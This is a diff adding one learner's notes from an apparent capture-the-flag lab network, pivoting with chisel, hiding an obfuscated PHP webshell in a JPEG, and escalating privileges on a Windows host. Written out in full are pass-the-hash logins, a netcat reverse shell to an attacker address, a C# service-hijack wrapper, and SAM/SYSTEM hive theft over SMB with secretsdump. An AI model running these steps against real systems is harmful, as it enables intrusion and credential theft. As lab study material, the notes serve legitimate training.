@@ -544,7 +544,7 @@ Linux prod-serv 4.18.0-193.28.1.el8_2.x86_64 #1 SMP Thu Oct 22 00:20:22 UTC 2020
 ```
 
 Binary folder locations:
-1. `/opt/static-binaries/`
+1. `/opt/static-binaries/binaries/`
 2. `/usr/share/windows-binaries`
 
 **For example, with a Python webserver:**
@@ -881,8 +881,366 @@ I get the agent back and complete this part.
 - It has 2 modes: 1. Execute Module. 2. Shell Command. 
 - Shell command is where you can use things like `whoami`
 
+_Check short instructions for infor reconnecting after deleted files_
+
+**Git-Server**
+
+reconnect attaching powershell scripts this time so i can run a port scan of the personal computer
+
+win-rm scripts
+
+```php
+evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.57.150 -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/
+```
+
+**Scanning**
+
+```php
+Invoke-Portscan.ps1
+```
+
+```php
+Get-Help Invoke-Portscan
+```
+
+```php
+Invoke-Portscan -Hosts 10.200.57.100 -TopPorts 50
+```
+
+![[Pasted image 20240723074154.png]]
+
+**Chisel**
+_I need to open a firewall port when using chisel. I'll be using chisel because i used shhuttle as recommended._
+
+```php
+netsh advfirewall firewall add rule name="chisel-Platos" dir=in action=allow protocol=tcp localport=22891
+```
+
+_Don't forget the naming convention ==name-username==_
+
+**Port:22891**
+
+![[Pasted image 20240723074802.png]]
+
+**Chisel Forward Proxy**
+
+Required files:
+- [chisel_1.9.1_windows_386.gz](https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_386.gz) 32Bit
+- [chisel_1.7.5_linux_amd64.gz](https://github.com/jpillora/chisel/releases/download/v1.7.5/chisel_1.7.5_linux_amd64.gz) 64Bit
+- `gunzip <FILE>`
+
+1. Restart `Evil-WinRM`
+2. `upload chisel.exe`
+3. I may need to add chisel to proxychains.conf (wasn't required as i could access the website using a burp proxy)
+
+Target
+```php
+.\chisel-Platos.exe server -p 22891 --socks5
+```
+
+![[Pasted image 20240723081558.png]]
+
+Attacker
+```php
+chisel client 10.200.57.100:22891 9090:socks
+```
+
+![[Pasted image 20240723081957.png]]
+
+
+Now i need to setup foxyproxy to use this and i should be able to see the webpage on the personal computer.
+
+`127.0.0.1:9090`
+
+**UPDATED:**
+I need to use chisel 1.7.7 or it wont work.
+[chisel_1.7.5_linux_386.gz](https://github.com/jpillora/chisel/releases/download/v1.7.5/chisel_1.7.5_linux_386.gz) 32Bit
+[chisel_1.7.5_linux_amd64.gz](https://github.com/jpillora/chisel/releases/download/v1.7.5/chisel_1.7.5_linux_amd64.gz) 64Bit
+[chisel_1.7.5_windows_386.gz](https://github.com/jpillora/chisel/releases/download/v1.7.5/chisel_1.7.5_windows_386.gz) 32Bit
+[chisel_1.7.5_windows_amd64.gz](https://github.com/jpillora/chisel/releases/download/v1.7.5/chisel_1.7.5_windows_amd64.gz) 64Bit
+
+Releases:
+https://github.com/jpillora/chisel/releases
+
+- Make sure to use the correct files `.\chisel.exe` ,and setup foxyproxy.
+
+Proxy info:
+![[Pasted image 20240723095537.png]]
+
+![[Pasted image 20240723095558.png]]
+
+![[Pasted image 20240723100428.png]]
+
+Download the `website.git` to my local machine.
+![[Pasted image 20240723101008.png]]
+
+After renaming the directory to `.git` i download the required tools
+```php
+git clone https://github.com/internetwache/GitTools
+```
+
+The syntax for Extractor is as follows:  
+`./extractor.sh REPO_DIR DESTINATION_DIR`
+
+```php
+GitTools/Extractor/extractor.sh . Website
+```
+
+This uses the current directory "`.`" (as the parent of the `.git` directory) and extracts into a newly created `Website` subdirectory.
+
+The most up to date version of the site stored in the Git repository is in the `NUMBER-345ac8b236064b431fa43f53d91c98c4834ef8f3` directory.
+
+![[Pasted image 20240723102309.png]]
+
+```php
+cd 0-345ac8b236064b431fa43f53d91c98c4834ef8f3
+```
+
+```php
+find . -name "*.php"
+```
+
+`./resources/index.php`
+
+![[Pasted image 20240723102620.png]]
+
+File types accepted
+![[Pasted image 20240723102927.png]]
+
+![[Pasted image 20240723103046.png]]
+
+Accessing the page:
+
+![[Pasted image 20240723103241.png]]
+
+![[Pasted image 20240723103326.png]]
+
+**Credentials:**
+UserName
+thomas
+
+Password
+i<3ruby
+
+**Uploading a test file**
+And because i know Thomas loves cats:
+![[Pasted image 20240723104108.png]]
+
+SO now i should be able to insert a obfuscated php shell in the comments of a cat picture, using exiftool.
+```php
+mv test.cat.jpg Platos-cat-test.jpg.php
+```
+
+Exiftool will tell me if it's still recognised a jpg image
+```php
+exiftool Platos-cat-test.jpg.php
+```
+
+Test Payload
+```php
+<?php echo "<pre>Test Payload</pre>"; die();?>
+```
+
+```php
+exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-Platos.jpeg.php
+```
+
+![[Pasted image 20240723104746.png]]
+
+I can now test the file in the same way i did previously.
+
+```php
+/resources/uploads/Platos-cat-test.jpg.php
+```
+
+![[Pasted image 20240723105445.png]]
+
+**Reverse Shell**
+
+Payload:
+```php
+exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" shell-USERNAME.jpeg.php
+```
+
+- Put this inside our image like i did with the test image
+- I created a new shell image exploit file then inserted the code
+- Upload the file and navigate to it
+- Remote execution with `?wreath=whoami`
+
+![[Pasted image 20240723110933.png]]
+
+![[Pasted image 20240723111048.png]]
+
+I download a copy of netcat.exe ready to curl onto the machine.
+`git clone https://github.com/int0x33/nc.exe/`
+
+```php
+curl http://10.50.55.235/nc64.exe -o c:\\windows\\temp\\nc-Platos3.exe
+```
+
+Set up a netcat listener on your attacking machine: 
+```php
+nc -nlvp 20188
+```
+
+Then, in your webshell, use the following command:  
+```php
+powershell.exe c:\\windows\\temp\\nc-Platos3.exe 10.50.55.235 20188 -e cmd.exe
+```
+
+- I ended up stuck on this for a while, but i figured out that it has to be `nc64.exe `specifically, it will **NOT** work with just the regular `nc.exe`.
+
+![[Pasted image 20240723115854.png]]
+
 ---
 # Personal PC
 
+==10.200.57.100==
+
+`wreath-pc\thomas`
+
+![[Pasted image 20240723120037.png]]
+
+![[Pasted image 20240723120113.png]]
+
+Let's start by looking for non-default services:  
+`wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"`
+
+```php
+wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
+```
+
+![[Pasted image 20240723120251.png]]
+
+![[Pasted image 20240723120425.png]]
+
+First of all, let's check to see which account the service runs under:  
+`sc qc SERVICE_NAME`
+
+```php
+sc qc SERVICE_NAME
+```
+
+![[Pasted image 20240723120622.png]]
+
+Let's check the permissions on the directory. If we can write to it, we are golden:  
+`powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"`
+
+```php
+powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
+```
+
+![[Pasted image 20240723120835.png]]
+
+**MONO**
+I need to install mono so i can build a wrapper.
+
+```php
+sudo apt install mono-devel
+```
+
+```php
+sudo nano wrapper.cs
+```
+
+```cs
+using System;
+using System.Diagnostics;
+
+namespace Wrapper{
+    class Program{
+        static void Main(){
+            //First, we create a new process, as well as a ProcessStartInfo object to set the parameters for the process
+                Process proc = new Process();
+                ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-Platos3.exe", "10.50.55.235 29999 -e cmd.exe");
+                procInfo.CreateNoWindow = true;
+                proc.StartInfo = procInfo;
+                proc.Start();
+                
+        }
+    }
+}
+```
+
+We can now compile our program using the Mono `mcs` compiler. This is extremely simple using the package we installed earlier:  
+`mcs Wrapper.cs`
+
+__Check for running exploits and wait a minute if one is already running__
+
+```php
+dir "C:\Program Files (x86)\System Explorer\"
+```
+
+Copy your wrapper from `C:\Windows\Temp\wrapper-USERNAME.exe` to `C:\Program Files (x86)\System Explorer\System.exe` .  
+
+```php
+copy wrapper-Platos.exe "C:\Program Files (x86)\System Explorer\System.exe"
+```
+
+```php
+copy C:\xampp\htdocs\resources\uploads\wrapper-Platos.exe "C:\Program Files (x86)\System Explorer\System.exe"
+```
+
+Stop/Start service
+
+```php
+sc stop SystemExplorerHelpService
+```
+
+```php
+sc start SystemExplorerHelpService
+```
+
+- I had to move into the directory with the file to start and stop the service and then it worked, but that could have been just a error the first time i tried.
+
+![[Pasted image 20240723125016.png]]
+
+**Exfiltration**
+
+```php
+reg.exe save HKLM\SAM sam.bak
+```
+
+```php
+reg.exe save HKLM\SYSTEM system.bak
+```
+
+**SMB**
+
+start up a temporary SMB server: 
+```php
+sudo smbserver.py share . -smb2support -username user -password s3cureP@ssword
+```
+
+Now, in our reverse shell, we can use this command to authenticate:
+
+```php
+net use \\10.50.55.235\share /USER:user s3cureP@ssword
+```
+
+![[Pasted image 20240723132608.png]]
+
+Transfer files through SMB
+
+```php
+reg.exe save HKLM\SAM sam.bak \\10.50.55.235\share\sam.bk
+```
+
+```php
+reg.exe save HKLM\SYSTEM system.bak \\10.50.55.235\share\system.bk
+```
+
+_If already saved i could use `move sam.bak \\ATTACKING_IP\share\sam.bak`_
+- For some reason it wouldn't move it straight to smb, but i could move it after getting it into my pwd.
+
+![[Pasted image 20240723135626.png]]
+
+```php
+python3 /opt/impacket/examples/secretsdump.py -sam PATH/TO/SAM_FILE -system PATH/TO/SYSTEM_FILE LOCAL
+```
 
 
+
+---
+
+![[Pasted image 20240723133800.png]]
